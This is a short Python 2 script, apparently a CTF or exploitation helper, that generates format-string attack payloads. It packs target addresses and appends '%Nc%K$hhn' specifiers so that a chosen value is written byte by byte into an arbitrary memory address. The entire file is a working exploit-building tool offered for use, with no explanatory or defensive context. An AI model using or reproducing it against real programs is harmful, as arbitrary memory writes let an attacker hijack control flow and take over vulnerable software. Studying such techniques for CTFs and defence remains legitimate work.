#!/usr/bin/env python
# encoding: utf-8

import argparse
from struct import pack
        
def main():
	
	parser = argparse.ArgumentParser(description="Create payload for format string bug exploitation")
	parser.add_argument('format_number', help='offset of formater')
	parser.add_argument('addr_to_o', help='address to overwrite')
	parser.add_argument('addr_to_w', help='address to write')
	parser.add_argument('--aprint', help='number of chars already prints')
	args = parser.parse_args()
	
	# add addr_to_o on the payload
	payload = ""
	for i in range(4):
	    payload += pack('<i', int(args.addr_to_o, 16)+i)

	# format addr_to_w
	addr_to_w = pack('<i', int(args.addr_to_w, 16))
	
	# add addr_to_w on the payload
	total = 16
	if args.aprint is not None:
	    total += int(args.aprint)
	    
	for i in range(4):
	    diff = 0
	    while ((total + diff) & 0xff) != ord(addr_to_w[i]):
	        diff += 1
	    total += diff
	    
	    if diff != 0:
	        payload += "%{0}c%{1}$hhn".format(diff,int(args.format_number)+i)
	    else:
	        payload += "%{0}$hhn".format(int(args.format_number)+i)
	        
	print "Your payload : \n%s" % (repr(payload)[1:-1])
	    	    
if __name__ == '__main__':
	main()

